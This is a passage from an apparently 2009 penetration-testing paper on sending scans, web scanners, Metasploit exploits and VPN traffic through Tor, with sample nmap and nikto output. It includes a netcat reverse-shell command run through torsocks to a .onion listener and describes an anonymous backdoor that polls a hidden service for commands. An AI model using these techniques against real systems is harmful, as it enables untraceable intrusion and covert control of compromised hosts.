The first step in making TOR more useful for a pen tester is to control the exit nodes. To 
do this there are a couple of edits that need to be preformed to the torrc file. The 
ExitNodes and StrictExitNodes parameters need to be set to useful values. The ExitNodes 
parameter is a comma separated list of nodes, where a node can be defined by its 
fingerprint or name. The StrictExitNodes parameter should be set to 1, telling TOR to 
only use the exit nodes defined above. 
The first big hurtle is finding the exit node that is desired for use. There are many ways to 
do this. The first is to simply use the Vidalia map tool. Click on each node, read where it 
is, and use the name from the map if it matches the desired location. Be aware that names 
are not guaranteed unique, so make sure that there are no duplicate names to the ones that 
you pick. 
If the exit node location is crucial, there are better ways to guarantee that the correct exit 
nodes are chosen. The website https://torstatus.blutmagie.de/ gives a list of TOR nodes, 
up times, country of origin, and most importantly fingerprints. When looking through the 
list, it is important to remember that not all nodes listed are up at any given time, so many 
should be chosen or tested. The fingerprint that is provided on this site needs to be 
converted to a usable fingerprint for a torrc file. To do this, all spaces must be removed, 
and a dollar sign added to the beginning. For example:
Unnamed: 46D0 5072 0DE9 D59E 6C22 D970 453B E287 C03F CE9B → 
$46D050720DE9D59E6C22D970453BE287C03FCE9B
In the documentation for TOR there is a mention of simply defining an exit country. This 
doesn't work in the current stable version TOR at the time of this paper. So be careful 
when using this feature. 
7.3 Making Any Service go Through TOR
Page 16 of 26
TOR is a Socks5 proxy, and as such can tunnel any TCP connection with a bit of work. 
There are a couple of different tools available for sending TCP connections over a socks5 
proxy, and in some cases customized for TOR. Each one has its benefits and downfalls, 
so familiarizing yourself all is often a good idea. 
ProxyChains
ProxyChains has the nice feature that it will give feedback, which makes it the most 
useful for demos, and for testing. ProxyChains is not safe to use DNS through, so always 
try and use IP addresses to prevent leakage of the DNS request. 
Setting up ProxyChains is relatively easy. There is a file on most Linux distributions with 
ProxyChains installed that is called /etc/proxychains.conf. The following should be 
commented out: random_chain, chain_len, and any example proxies. Then un­comment 
or add dynamic_chain, and at the bottom add a socks 5 proxy for TOR
 “socks5 127.0.0.1 9050”. 
Depending on the path and target, the tcp_read_time_out and tcp_connect_time_out 
values will need to be tweaked. The bigger these are the more likely they will get the 
right port, but they may run into other problems, like slow scans, or more false positive 
scans.
Tsocks
Tsocks has no real feedback for the user, and will always answer for a port, regardless if 
it is open on the other end. This makes nmap and other port scanning tools less useful, 
but can be helpful with other types of programs. Tsocks will not protect DNS, so always 
try and use IP addresses to prevent leakage of the DNS request
Configuring tsocks is easier than proxychains. The file /etc/tsocks needs the following 
three lines uncommented:
server = 127.0.0.1 # tor host, usually local
server_type = 5 # Socks4/5, usually 5
server_port = 9050 # tor port, default 9050
Torsocks
Torsocks is the torsentric tsocks replacement. It has a couple of nice features including 
DNS resolution allowing access to .onion sites, and attempts to detect UDP and blocking 
them. It is configured straight out of the build for most tor installations. This like tsocks 
will answer for most any port, resulting in mixed nmap results. For most other scans and 
uses, this is a much nicer tool. 
Page 17 of 26
Using Proxychains/Tsocks/torsocks
All three of these are tools that are run in front of the command you want to go over 
TOR. It is very valuable to try these tools in a test environment because they require a lot 
of tweaking to be sure you aren’t leaking attributable information.
nmap
Nmap is a nice tool to use over TOR, but requires a lot of attention. In order to keep your 
identity safe, be sure to use ­N and ­PN on the nmap command line. These will turn off 
reverse name lookup and ping, both of which could leak your real identity. 
Using ProxyChains output, it becomes easy to create a list of open ports on the remote 
end to speed up the scans. Here is an example:
user@laptop:~/tor_rc$ proxychains nmap ­n ­PN ­p 80,22,443 192.1.167.74
Starting Nmap 4.76 ( http://nmap.org ) at 2009­05­25 09:41 MDT
ProxyChains­2.1 (http://proxychains.sf.net)
dynamic chain:....127.0.0.1:9050....access denied to..192.1.167.74:443
dynamic chain:....127.0.0.1:9050....access denied to..192.1.167.74:443
…
user@laptop:~/tor_rc$ proxychains nmap ­n ­A ­PN ­p 80,22 192.1.167.74
Starting Nmap 4.76 ( http://nmap.org ) at 2009­05­25 09:42 MDT
ProxyChains­2.1 (http://proxychains.sf.net)
dynamic chain:....127.0.0.1:9050....192.1.167.74:22..OK
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
dynamic chain:....127.0.0.1:9050....192.1.167.74:22..OK
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
...
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp open http Apache httpd
Service Info: OS: Linux
The access denied message is an easy way to tell that 443 is not supported, and instead of 
waiting for the timeout of proxychains (which can be long), a new list is provided. The 
Page 18 of 26
timeout of torsocks will make for a much faster scan, but will show all ports open. If the ­
A option on nmap is used, it becomes possible to take a good guess at what ports are 
really open and which are not. 
7.4 Running Nikto and Other Web Scanners Over TOR
The easiest way to web scan a target anonymously is to simply run nikto over privoxy 
using the PROXY* variables and use the ­u on the command line. The problem is that 
privoxy will recognize a lot of the tests as dangerous, and the results will be unrealiable 
and flagged as “unsafe”. The reality is that the tests are safe, as they are coming from a 
nikto, and not firefox. 
Torsocks or any of the other proxy tools will allow for nikto to do a full complete scan of 
the remote system. Here is an example with proxychains, again used for the feedback 
valuable in testing:
user@laptop:~/$ proxychains nikto ­host blog.attackresearch.com 192.1.167.74
­ Nikto v2.03/2.04
­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­
ProxyChains­2.1 (http://proxychains.sf.net)
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
+ Target IP: 192.1.167.74
+ Target Hostname: blog.attackresearch.com
+ Target Port: 80
+ Start Time: 2009­05­26 10:12:46
­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­
+ Server: Apache
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
...
­ /robots.txt ­ contains 40 'disallow' entries which should be manually viewed. 
(GET)
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
+ OSVDB­0: Retrieved X­Powered­By header: PHP/5.2.4­2ubuntu5.4
dynamic chain:....127.0.0.1:9050....192.1.167.74:80..OK
+ OSVDB­0: ETag header found on server, inode: 131801, size: 1820, mtime: 
0x462ed49df8840
...
Page 19 of 26
+ 3577 items checked: 32 item(s) reported on remote host
+ End Time: 2009­05­26 15:07:00 (17654 seconds)
­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­
+ 1 host(s) tested
Test Options: ­host blog.attackresearch.com 192.1.167.74
­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­­
The ­host is not doing a dangerous lookup, it is just using this hostname in the HTTP 
headers. 
7.5 Using VPN over TOR
It is possible to use the PPTP VPN client over TOR. It is slow, and will not work well, 
but if you need it for a pen test it is possible. This requires a bit of creativity and multiple 
machines. Machine A will have to and a port redirection software like tcpxd. Machine B 
is the attack machine with the PPTP client. On machine A use tsocks to start the tcpxd 
software with the ports and target machine. Since tsocks only attaches to outgoing ports, 
machine B can PPTP into machine A, which will really redirect it over TOR to the target.
7.6 Metasploit and TOR
The final important step is actually exploiting over TOR. This is actually much easier 
than one would think. Metasploit has a built in global setting “Proxies” that will allow 
Metasploit to work over the tor network. Other exploits will work with torsocks as listed 
above. In Metasploit, set up an exploit as normal, but also issue the command:
setg Proxies SOCKS4:localhost:9050
This will send all the exploit traffic over TOR. Remember that reverse shells will not 
work over TOR, and will in fact reveille the attackers IP. 
7.7 Making an Anonymous Reverse Shell Server
Tor allows for hidden servers throughout the tor “.onion” domain. It is possible for a call 
back shell to take advantage of this to hide the tracks of the server. The .onion domains 
are only accessible through the tor software, so this will create some difficulties, but in 
the end provides a powerful anonymous way to call back from a hacked system. 
Setting up a .onion listener
In order to set up a .onion, the following two lines need to be added to your torrc file:
Page 20 of 26
HiddenServiceDir /my/service/dir/
HiddenServicePort  127.0.0.1:
The HiddenServiceDir will set up a directory that will contain the .onion host name and 
private key, and the HiddenServicePort is telling tor where to forward traffic. A simple 
test service could be:
nc ­l ­p 
Getting a Shell from the target
This is all assuming that TOR and torsocks is on the target. This can be from the attacker 
installing it, or that it is already there. 
With netcat, remember that only torsocks will do the DNS lookup for nc. This is 
important as the DNS really has to be done by the socks proxy in order to get the .onion 
domain to work. The netcat command will look something like this on the target:
torsocks nc ­e /bin/bash  
The hostname comes from the server's HiddenServiceDir. Now on the attacker’s 
machine, assuming there is a netcat listener setup, there is a bash shell running through 
TOR.
Doing it without TOR
There are some web services on the Internet that will let a user talk to a .onion domain 
without TOR installed. One example is tor­proxy.net. By creating a custom backdoor that 
talks to tor­proxy.net, it becomes possible to have a completely hidden reverse shell. It is 
true that tor­proxy.net can read all the traffic, and will know who was attacked, but they 
can't tell where the attacker is. 
The custom backdoor that we have created to use tor­proxy.net makes periodic queries to 
a .onion site under our control. These queries will receive new commands encoded in the 
response. The output will be returned in the get strings. This makes for a non­interactive, 
but anonymous backdoor.